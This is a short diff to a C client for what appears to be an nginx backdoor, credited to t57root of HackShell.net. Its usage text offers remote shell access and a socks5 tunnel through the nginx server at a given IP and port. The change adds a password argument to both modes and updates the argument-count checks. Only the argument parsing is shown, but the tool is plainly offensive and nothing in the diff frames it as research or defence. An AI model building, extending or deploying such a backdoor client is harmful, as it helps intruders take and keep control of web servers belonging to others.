@@ -24,6 +24,7 @@
 
 char *ip;
 char *port;
+char *password;
 
 int main(int argc,char **argv)
 {
@@ -31,8 +32,8 @@ int main(int argc,char **argv)
     "Copyleft by t57root @ openwill.me\n"
     "<t57root@gmail.com>  [www.HackShell.net]\n\n"
     "Usage:\n"
-    "Get a shell access via the nginx running @ [ip]:[port]\n\t%s shell [ip] [port]\n"
-    "Get a socks5 tunnel listening at [socks5ip]:[socks5port]\n\t%s socks5 [ip] [port] [socks5ip] [socks5port]\n"
+    "Get a shell access via the nginx running @ [ip]:[port]\n\t%s shell [ip] [port] [password]\n"
+    "Get a socks5 tunnel listening at [socks5ip]:[socks5port]\n\t%s socks5 [ip] [port] [socks5ip] [socks5port] [password]\n"
     ,argv[0],argv[0]);
     char *action = argv[1];
     ip = argv[2];
@@ -40,12 +41,14 @@ int main(int argc,char **argv)
 
     int function = 0;
 
-    if((argc==4 && strncmp(action,"shell",5)==0)){
+    if((argc==5 && strncmp(action,"shell",5)==0)){
         function = 1;
+        password = argv[4];
         printf("\n[i] Obtaining shell access\n");
     }
-    else if((argc==6 && strncmp(action,"socks5",6)==0)){
+    else if((argc==7 && strncmp(action,"socks5",6)==0)){
         function = 2;
+        password = argv[6];
         printf("\n[i] Obtaining a socks5 proxy tunnel\n");
     }
     else return 0;
